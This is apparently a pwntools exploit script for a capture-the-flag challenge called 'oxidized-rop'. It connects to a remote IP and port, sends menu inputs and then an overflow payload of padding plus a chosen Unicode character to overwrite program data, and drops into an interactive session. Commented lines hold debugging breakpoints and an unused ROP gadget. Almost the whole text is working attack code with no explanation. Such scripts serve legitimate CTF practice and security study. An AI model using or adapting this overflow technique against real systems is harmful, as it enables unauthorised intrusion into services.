from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./oxidized-rop")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}


p = remote("167.99.82.136", 32007)
#p = process("./oxidized-rop")
#p = gdb.debug("./oxidized-rop",'''
#b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E
#b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E+226
#b *_ZN12oxidized_rop4main17h3b2fbbcaac189096E+236''')

# Stack Canary Leak Setup
p.sendline(b"1")
p.recvline()

#ROP
pop_rdi = p64(0x0000000000007f75)

# unicode standard is different
# use correct unicode to EIP & variable address correctly
#unicode_C = '\u0056'
unicode_B = '\U0001e240'


# Exploit
padA = 'A' * 102
padB = 'B' * 2
padC = 'C' * 18

exploit = padA + unicode_B + padC
p.recvline()
p.sendline(exploit)

p.sendline(b"2")
p.recvline()

p.interactive()
